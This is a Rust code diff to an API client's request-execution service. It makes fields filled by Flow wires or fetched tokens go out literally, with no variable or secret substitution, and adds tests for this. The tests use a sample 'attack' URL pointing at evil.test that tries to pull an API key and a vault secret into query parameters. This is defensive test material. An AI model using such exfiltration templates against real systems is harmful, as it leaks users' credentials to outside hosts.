@@ -146,16 +146,15 @@ pub struct ExecuteRequestInput {
     #[serde(skip)]
     pub backend_process_env: bool,
     /// The fields a Flow wire or a fetched Auth-node token filled in. Their text did not
-    /// come from the saved request, so they never resolve `{{process.env.NAME}}`. Never
-    /// read from or written to the wire.
+    /// come from the saved request, so it is sent as written: no variable of any scope,
+    /// `process.env` included, is put into it. Never read from or written to the wire.
     #[serde(skip)]
-    pub host_env_free: HostEnvFreeFields,
+    pub literal: LiteralFields,
 }
 
-/// The request fields that resolve without the host environment. See
-/// `ExecuteRequestInput::host_env_free`.
+/// The request fields that are sent as written. See `ExecuteRequestInput::literal`.
 #[derive(Debug, Clone, Default)]
-pub struct HostEnvFreeFields {
+pub struct LiteralFields {
     pub url: bool,
     pub body: bool,
     pub auth: bool,
@@ -1423,14 +1422,13 @@ impl RequestExecutionService {
             input.request_path.as_deref(),
             external_secrets,
         );
-        // Client certificates and the fields a Flow wire or token filled use the map
-        // without the host environment.
+        // Client certificates use the map without the host environment.
         let mut plain_vars = scopes.flatten();
         plain_vars.extend(input.flow_vars.clone());
         scopes.process_env = process_env.vars.clone();
         let mut vars = scopes.flatten_with_process_env();
         vars.extend(input.flow_vars.clone());
-        let free = &input.host_env_free;
+        let literal = &input.literal;
 
         // Merge collection and folder-chain auth and headers with request-level values.
         let (effective_auth, effective_headers) = self.inherited_auth_and_headers(
@@ -1443,29 +1441,33 @@ impl RequestExecutionService {
         // Each field is recorded as a template, so the pass after the pre-request scripts can
         // put runtime values into it without reading a filled-in value again.
         let unresolved = RefCell::new(std::collections::HashSet::new());
-        // The `process.env` names of the fields that resolve with the host environment.
+        // The `process.env` names of the recorded fields (literal fields have none).
         let host_names = RefCell::new(std::collections::BTreeSet::new());
-        let rec_with = |text: &str, json: bool, host_env: bool| -> FieldTemplate {
-            let map = if host_env { &vars } else { &plain_vars };
-            let template = FieldTemplate::record(text, json, map, &mut unresolved.borrow_mut());
-            if host_env {
-                host_names
-                    .borrow_mut()
-                    .extend(template.process_env_names().map(str::to_string));
-            }
+        let rec = |text: &str, json: bool| -> FieldTemplate {
+            let template = FieldTemplate::record(text, json, &vars, &mut unresolved.borrow_mut());
+            host_names
+                .borrow_mut()
+                .extend(template.process_env_names().map(str::to_string));
             template
         };
-        let rec = |text: &str, json: bool| rec_with(text, json, true);
+        // A field a Flow wire or a fetched token filled is sent as written.
+        let field = |text: &str, json: bool, is_literal: bool| {
+            if is_literal {
+                FieldTemplate::literal(text)
+            } else {
+                rec(text, json)
+            }
+        };
 
         // Resolve {{placeholders}} in auth, URL and headers.
         let auth_templates = RefCell::new(Vec::new());
         let effective_auth = map_auth_fields(effective_auth, |s: String| {
-            let template = rec_with(&s, false, !free.auth);
+            let template = field(&s, false, literal.auth);
             let output = template.output.clone();
             auth_templates.borrow_mut().push(template);
             output
         });
-        let url_template = rec_with(&input.url, false, !free.url);
+        let url_template = field(&input.url, false, literal.url);
         // Path parameter values may hold {{placeholders}}, so they resolve before they are
         // substituted. The substitution runs on the resolved URL, so a placeholder in the URL
         // itself never swallows a parameter.
@@ -1498,11 +1500,8 @@ impl RequestExecutionService {
         let header_templates: Vec<(FieldTemplate, FieldTemplate)> = effective_headers
             .iter()
             .map(|h| {
-                let host_env = !free.headers.contains(&h.key.to_ascii_lowercase());
-                (
-                    rec_with(&h.key, false, host_env),
-                    rec_with(&h.value, false, host_env),
-                )
+                let is_literal = literal.headers.contains(&h.key.to_ascii_lowercase());
+                (rec(&h.key, false), field(&h.value, false, is_literal))
             })
             .collect();
         let resolved_headers: Vec<Header> = effective_headers
@@ -1523,7 +1522,7 @@ impl RequestExecutionService {
         let mut form_templates = Vec::new();
         let resolved_body = input.body.clone().map(|mut body| {
             if let Some(content) = &body.content {
-                let template = rec_with(content, body.mode == BodyMode::GraphQl, !free.body);
+                let template = field(content, body.mode == BodyMode::GraphQl, literal.body);
                 body.content = Some(template.output.clone());
                 body_template = Some(template);
             }
@@ -3997,7 +3996,7 @@ mod tests {
             request_guard_policy: rocket_workspace::RequestGuardPolicy::default(),
             run_source: rocket_shared::RunSource::Manual,
             backend_process_env: false,
-            host_env_free: Default::default(),
+            literal: Default::default(),
         }
     }
 
@@ -5104,6 +5103,108 @@ mod tests {
             "enabled must be preserved"
         );
         assert_eq!(resolved.query_params[1].value, "abc 123");
+    }
+
+    /// A service whose `dev` environment holds `apiKey = "k-123"`, and a vault map holding
+    /// `vault.secret`.
+    fn literal_svc() -> (
+        RequestExecutionService,
+        std::collections::HashMap<String, String>,
+    ) {
+        let mut env = Environment::new("dev");
+        env.set_variable(Variable::new("apiKey", "k-123"));
+        let svc = RequestExecutionService::new(
+            Box::new(MockEnvRepo::with_env(env)),
+            Arc::new(MockExecutor::new(200)),
+            Box::new(MockHistoryRepo::new()),
+            Box::new(StubCollectionRepo::empty()),
+            Box::new(NullCookieRepo),
+            Box::new(NullEventPublisher),
+            Box::new(EmptySecretManagerRepo),
+            Arc::new(rocket_environment::NullSecretStore),
+            Arc::new(rocket_environment::NullVaultSecretFetcher),
+        );
+        let secrets =
+            std::collections::HashMap::from([("vault.secret".to_string(), "s3cr3t".to_string())]);
+        (svc, secrets)
+    }
+
+    #[tokio::test]
+    async fn literal_fields_are_sent_as_written() {
+        use rocket_shared::types::{Body, BodyMode};
+
+        let (svc, secrets) = literal_svc();
+        let attack = "https://evil.test/c?k={{apiKey}}&v={{vault.secret}}";
+        let mut input = sample_input(attack, Some("dev"));
+        input.headers = ["X-Wired", "X-Saved"]
+            .iter()
+            .map(|key| Header {
+                key: key.to_string(),
+                value: "{{apiKey}}".into(),
+                enabled: true,
+                description: None,
+            })
+            .collect();
+        input.body = Some(Body {
+            mode: BodyMode::Json,
+            content: Some(r#"{"v":"{{vault.secret}}"}"#.into()),
+            form_data: None,
+            file_path: None,
+        });
+        input.auth = Auth::Bearer {
+            token: "{{apiKey}}".into(),
+        };
+        input.literal = LiteralFields {
+            url: true,
+            body: true,
+            auth: true,
+            headers: ["x-wired".to_string()].into(),
+        };
+
+        let resolved = svc.resolve_request(&input, &secrets).expect("resolve");
+
+        let header = |key: &str| {
+            resolved
+                .headers
+                .iter()
+                .find(|h| h.key == key)
+                .map(|h| h.value.clone())
+                .unwrap_or_default()
+        };
+        assert_eq!(resolved.url, attack);
+        assert_eq!(header("X-Wired"), "{{apiKey}}");
+        assert_eq!(header("X-Saved"), "k-123", "saved text still resolves");
+        assert_eq!(
+            resolved.body.clone().and_then(|b| b.content).as_deref(),
+            Some(r#"{"v":"{{vault.secret}}"}"#)
+        );
+        assert_eq!(
+            resolved.auth,
+            Auth::Bearer {
+                token: "{{apiKey}}".into()
+            }
+        );
+    }
+
+    #[tokio::test]
+    async fn literal_graphql_body_is_sent_as_written() {
+        use rocket_shared::types::{Body, BodyMode};
+
+        let (svc, secrets) = literal_svc();
+        let mut input = sample_input("https://api.example.com/graphql", Some("dev"));
+        input.body = Some(Body {
+            mode: BodyMode::GraphQl,
+            content: Some(r#"{"query":"{{apiKey}}"}"#.into()),
+            form_data: None,
+            file_path: None,
+        });
+        input.literal.body = true;
+
+        let resolved = svc.resolve_request(&input, &secrets).expect("resolve");
+
+        let body = resolved.body.expect("body");
+        assert_eq!(body.content.as_deref(), Some(r#"{"query":"{{apiKey}}"}"#));
+        assert_eq!(body.mode, BodyMode::Json);
     }
 
     #[tokio::test]
